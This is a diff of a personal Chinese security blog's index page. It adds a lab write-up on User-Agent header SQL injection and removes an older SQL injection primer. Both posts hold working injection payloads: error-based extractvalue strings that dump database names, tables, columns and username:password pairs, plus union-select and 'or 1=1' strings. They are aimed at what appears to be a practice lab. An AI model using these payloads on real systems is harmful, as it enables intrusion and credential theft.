@@ -64,6 +64,109 @@
       <div id="main" class="wrapper">
         <div id="primary" class="site-content"><div id="content" role="main">
   
+    <article id="post-POST注入-HTTP头注入" class="post-POST注入-HTTP头注入 post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title">
+      <a class="article-title" href="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/">POST注入-HTTP头注入</a>
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/" data-id="ckza15jii00027gmahtng48u5" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><h5 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h5><p>HTTP头中的参数带入到数据库被执行，造成了HTTP头注入。</p>
+<h3 id="SERVER详解"><a href="#SERVER详解" class="headerlink" title="$_SERVER详解"></a>$_SERVER详解</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>]          <span class="comment">//当前脚本的路径</span></span><br><span class="line">dirname(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>]  <span class="comment">//dirname() 返回路径中的目录部分</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>]      <span class="comment">//当前脚本执行的绝对路径</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>]            <span class="comment">//获取当前域名</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_NAME&#x27;</span>]          <span class="comment">//输出配置文件httpd.conf中的ServerName，一般情况下与HTTP_HOST值相同</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SystemRoot&#x27;</span>]           <span class="comment">//当前服务器的操作系统的目录</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>]      <span class="comment">//服务器软件配置信息</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_PORT&#x27;</span>]          <span class="comment">//服务器端口</span></span><br><span class="line"><span class="variable">$_SERVER</span> [<span class="string">&#x27;REMOTE_PORT&#x27;</span>]         <span class="comment">//用户连接到服务器时所使用的端口</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_ADDR&#x27;</span>]          <span class="comment">//服务器的ip地址</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]          <span class="comment">//浏览网页的用户ip。</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>]        <span class="comment">//当前运行脚本所在的根目录</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_SCHEME&#x27;</span>]       <span class="comment">//服务器通信协议，是http或https。</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_ADMIN&#x27;</span>]         <span class="comment">//服务器管理员信息</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>]       <span class="comment">//请求数据的方式</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]          <span class="comment">//当前脚本路径，根目录之后的目录</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]             <span class="comment">//当前正在执行脚本的文件名</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_TIME&#x27;</span>]         <span class="comment">//得到请求开始时的时间戳。</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_COOKIE&#x27;</span>]          <span class="comment">//获取浏览器的cookie信息。</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CONNECTION&#x27;</span>]      <span class="comment">//当前请求的连接情况</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]      <span class="comment">//获取用户相关信息，包括用户浏览器、操作系统等信息</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT&#x27;</span>]          <span class="comment">//当前请求的ACCEPT头部信息</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT_LANGUAGE&#x27;</span>] <span class="comment">//返回用户默认的语言设置，后面的q值表示用户对该语言的喜好程度</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>查看源码可知有以下注意点：</p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205214039033.png" alt="image-20220205214039033"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]      <span class="comment">//获取用户相关信息，包括用户浏览器、操作系统等信息</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]          <span class="comment">//浏览网页的用户ip。</span></span><br></pre></td></tr></table></figure>
+
+<p>由于对uname和passwd进行了check_input()函数处理，导致在这两个字段上注入时不行的：</p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205214350305.png" alt="image-20220205214350305"></p>
+<p>但在源码中有了Insert字段，可以从这里入手。</p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205220615022.png" alt="image-20220205220615022"></p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205220601734.png" alt="image-20220205220601734"></p>
+<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>先尝试<code>admin</code>和<code>admin</code>登录，页面返回<code>User Agent</code>信息，由此在HTTP头里进行<code>User Agent</code>字段注入</p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205222503023.png" alt="image-20220205222503023"></p>
+<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>抓包改包：</p>
+<p>抓包后将<code>User Agent</code>随便添加了几个字符，页面也同样返回了几个字符：</p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205222953053.png" alt="image-20220205222953053"></p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205223005987.png" alt="image-20220205223005987"></p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205223022658.png" alt="image-20220205223022658"></p>
+<h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>爆库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &#x27;and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205223434243.png" alt="image-20220205223434243"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><code>and</code>前的<code>&#39;</code>是将<code>&#39;$uagent&#39;</code>中的前<code>&#39;</code>进行闭合，使用<code>or &#39;1&#39;=&#39;1</code>将<code>&#39;$uagent&#39;</code>后面的<code>&#39;</code>闭合；</p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205225102107.png" alt="image-20220205225102107"></p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205225118423.png" alt="image-20220205225118423"></p>
+<h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>爆版本号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and extractvalue(1,concat(0x7e,(select version()),0x7e)) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205225349977.png" alt="image-20220205225349977"></p>
+<h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><p>在爆表名的时候由于一个地方不知道什么原因试了很久，记录一下：</p>
+<p>这里一开始注入的是以下语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &#x27;and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>页面没有爆出表；</p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205234603717.png" alt="image-20220205234603717"></p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205234615471.png" alt="image-20220205234615471"></p>
+<p>当把<code>and</code>改成<code>or</code>才爆出表名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &#x27;or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205234819705.png" alt="image-20220205234819705"></p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205234826888.png" alt="image-20220205234826888"></p>
+<p>这里进行了一个实验，应该是出现上述情况的原因：</p>
+<p>注入语句用<code>and</code>连接的话，单引号闭合之后形成的是<code>&#39;&#39;</code>代表空值，而后面的<code>extractvalue()</code>查询到结果为真，也就是1，在mysql中实验如图：</p>
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205235435928.png" alt="image-20220205235435928"></p>
+<p>空值和1<code>and</code>完之后为0，可能导致数据库不返回报错信息，导致没有爆出表名。</p>
+<h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><p>爆字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &#x27;or extractvalue(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name=&#x27;users&#x27; limit 4,1),0x7e)) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206000302280.png" alt="image-20220206000302280"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &#x27;or extractvalue(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name=&#x27;users&#x27; limit 5,1),0x7e)) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206000402501.png" alt="image-20220206000402501"></p>
+<h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><p>爆内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &#x27;or extractvalue(1,concat(0x7e,(select concat(username,&#x27;:&#x27;,password) from users limit 0,1),0x7e)) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206000602759.png" alt="image-20220206000602759"></p>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/">
+    <time datetime="2022-02-05T13:27:35.000Z" class="entry-date">
+        2022-02-05
+    </time>
+</a>
+    
+    
+    </footer>
+</article>
+
+
+
+
+
+
+  
     <article id="post-POST注入-基于Password的注入" class="post-POST注入-基于Password的注入 post type-post status-publish format-standard hentry">
     <!---->
 
@@ -79,7 +182,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5/" data-id="ckz9gircf0005hwma2pf48dde" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5/" data-id="ckza15jij00037gmahk7w5042" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -164,7 +267,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/" data-id="ckz9gircd0003hwma5sqjh8cz" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/" data-id="ckza15jil00057gmadnmj5fw7" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -322,7 +425,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/04/SQL%E6%B3%A8%E5%85%A5-Less8-Less10/" data-id="ckz9gircc0002hwma8bjp14qw" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/04/SQL%E6%B3%A8%E5%85%A5-Less8-Less10/" data-id="ckza15jik00047gma4nfpesyy" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -377,7 +480,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/03/%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA-SQL%E9%9D%B6%E5%9C%BA/" data-id="ckz9gircw000lhwma3pb1crz8" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/03/%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA-SQL%E9%9D%B6%E5%9C%BA/" data-id="ckza15jj6000m7gma044k2wke" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -448,7 +551,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/" data-id="ckz9gircy000nhwmaa8p32t8c" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/" data-id="ckza15jj7000o7gma87aw3lsi" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -746,7 +849,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/" data-id="ckz9girce0004hwma6g9ze5br" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/" data-id="ckza15jim00077gma23u7d1ba" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -855,7 +958,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/01/SQL%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%93%8D%E4%BD%9C/" data-id="ckz9gircg0006hwmahpm4c7gj" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/01/SQL%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%93%8D%E4%BD%9C/" data-id="ckza15jil00067gmae6q95vu2" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -941,7 +1044,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/31/SQL%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD/" data-id="ckz9girch0007hwma96wcb7r9" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/31/SQL%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD/" data-id="ckza15jin00087gma1hxud48r" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -1078,7 +1181,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/30/Less1-Less4/" data-id="ckz9girca0001hwma2oc13o28" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/30/Less1-Less4/" data-id="ckza15jig00017gmagaqa074r" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -1260,126 +1363,6 @@
 
 
   
-    <article id="post-简要SQL注入" class="post-简要SQL注入 post type-post status-publish format-standard hentry">
-    <!---->
-
-      <header class="entry-header">
-        
-        
-  
-    <h1 class="entry-title">
-      <a class="article-title" href="/2022/01/30/%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5/">简要SQL注入</a>
-    </h1>
-  
-
-        
-        <div class="comments-link">
-            
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/30/%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5/" data-id="ckz9gircz000ohwmahvz9hje4" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
-        </div><!-- .comments-link -->
-      </header><!-- .entry-header -->
-
-    <div class="entry-content">
-      
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>SQL 注入漏洞将是重点部分，其中 SQL 注入 又非常复杂，区分各种数据库类型，提交方法，数据类型等注入等，此类漏洞是 WEB 安全中严重的安全漏洞，学习如何利用，挖掘，修复。</p>
-<h2 id="SQL注入图解"><a href="#SQL注入图解" class="headerlink" title="SQL注入图解"></a>SQL注入图解</h2><p><img src="/2022/01/30/%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5/image-20220130212558105.png" alt="image-20220130212558105"></p>
-<h2 id="手工注入原理"><a href="#手工注入原理" class="headerlink" title="手工注入原理"></a>手工注入原理</h2><p>手工注入：<br>构造不同的sql语句，用户输入的数据拼接到原本的语句之后带入数据库执行。</p>
-<p>数据库各种各样，但是：都用sql语句调用<br>  （不同的数据库，同样的操作，语句会有些许些许不同）<br><strong>这些不同可以让我们判断目标网站是什么类型的数据库。</strong></p>
-<p><strong>一、判断注入点</strong><br>id=1’在1后面加上单引号，页面出错</p>
-<p>id=1 and 1=1 正常 id=1 and 1=2 错误</p>
-<p>使用–注释时，需要使用空格，才能形成有效的sql语句，<br>而#后面可以有空格，也可以没有，sql就是这么规定的，记住就行了。</p>
-<p>不加空格，–直接和系统自动生成的单引号连接在了一起，</p>
-<p>会被认为是一个关键词，无法注释掉系统自动生成的单引号。</p>
-<p><strong>二、判断字段数</strong><br>order by：ORDER BY语句用于根据指定的列对结果集进行排序</p>
-<p><strong>三、判断回显点</strong><br>union联合 合并：将多条查询语句的结果合并成一个结果</p>
-<p>group_concat()函数：查出库中所有的表</p>
-<p><strong>四、查询相关内容</strong><br>猜询数据库版本<br>and 1=2 union select 1,version()</p>
-<p>猜询数据库</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,schema_name from information_schema.tables limit 0，1（...）</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,(select group_concat(schema_name) from           information_schema.tables)</span><br></pre></td></tr></table></figure>
-
-<p><strong>schema_name字段中存放着所有数据库名</strong><br><strong>table_schema字段中存储着对应的数据库</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select schema_name from information_schema.schemata</span><br></pre></td></tr></table></figure>
-
-<p>select database();查看当前所在的库</p>
-<p>猜询表名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,table_name  from  information_schema.tables where table_schema=database() limit 1,1</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,(select group_cancat(column_name) from information_schema.tables where table_schema=database() and table_name=&#x27;admin&#x27;)</span><br></pre></td></tr></table></figure>
-
-<p>【table_name字段中存储着对应的表名】<br>【column_name字段中存储着对应的值】</p>
-<p>查询字段内容</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,cancat(username,&#x27;,&#x27;,password) from admin</span><br></pre></td></tr></table></figure>
-
-<p>修改库名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rename database 库名  to  新库名；</span><br></pre></td></tr></table></figure>
-
-<p>修改列名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 库名 change column 旧列名 新列名 DATATIME（加类型）</span><br></pre></td></tr></table></figure>
-
-<p>修改列的类型或约束</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 库名 modify column 旧列名 TIMESTAMP；（修改类型）</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><ol>
-<li>version()——MySQL 版本 </li>
-<li>user()——数据库用户名 </li>
-<li>database()——数据库名 </li>
-<li>@@datadir——数据库路径 </li>
-<li>@@version_compile_os——操作系统版本</li>
-<li>concat(str1,str2,…)——没有分隔符地连接字符串</li>
-<li>concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串</li>
-<li>group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据</li>
-</ol>
-<h2 id="一般注入的语句"><a href="#一般注入的语句" class="headerlink" title="一般注入的语句"></a>一般注入的语句</h2><p>or 1=1–+ </p>
-<p>‘or 1=1–+ </p>
-<p>“or 1=1–+ </p>
-<p>)or 1=1–+ </p>
-<p>‘)or 1=1–+ </p>
-<p>“) or 1=1–+ </p>
-<p>“))or 1=1–</p>
-<p>其源码一般为：</p>
-<p>$id=$_GET[‘id’]; </p>
-<p>$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”</p>
-<p>此处考虑两个点，一个是闭合前面你的 ‘ 另一个是处理后面的 ‘ ，一般采用两种思 路，闭合后面的引号或者注释掉，注释掉采用–+ 或者 #（%23）</p>
-<p><strong>逻辑运算的举例</strong>：</p>
-<p>①Select * from users where id=1 and 1=1; </p>
-<p>②Select * from users where id=1 &amp;&amp; 1=1; </p>
-<p>③Select * from users where id=1 &amp; 1=1; </p>
-<p>上述三者有什么区别？</p>
-<p>①和②是一样的，表达的意思是 id=1 条件和 1=1 条件进行与运算。③的意思是 id=1 条件与 1 进行&amp;位操作，id=1 被当作 true，与 1 进行 &amp; 运算 结果还是 1， 再进行=操作，1=1,还是 1（ps：&amp;的优先级大于=）</p>
-<p><strong>完整的注入流程：</strong></p>
-<p>猜数据库 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select schema_name from information_schema.schemata </span><br></pre></td></tr></table></figure>
-
-<p>猜某库的数据表 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=’xxxxx’ </span><br></pre></td></tr></table></figure>
-
-<p>猜某表的所有列 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select column_name from information_schema.columns where table_name=’xxxxx’ </span><br></pre></td></tr></table></figure>
-
-      
-    </div><!-- .entry-content -->
-
-    <footer class="entry-meta">
-    <a href="/2022/01/30/%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5/">
-    <time datetime="2022-01-30T13:05:54.000Z" class="entry-date">
-        2022-01-30
-    </time>
-</a>
-    
-    
-    </footer>
-</article>
-
-
-
-
-
-
-  
   
     <nav id="pagination">
       <nav id="page-nav">
@@ -1409,6 +1392,10 @@
       <ul>
         
           <li>
+            <a href="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/">POST注入-HTTP头注入</a>
+          </li>
+        
+          <li>
             <a href="/2022/02/05/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5/">POST注入--基于Password的注入</a>
           </li>
         
@@ -1422,10 +1409,6 @@
         
           <li>
             <a href="/2022/02/03/%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA-SQL%E9%9D%B6%E5%9C%BA/">文件导入导出-SQL靶场</a>
-          </li>
-        
-          <li>
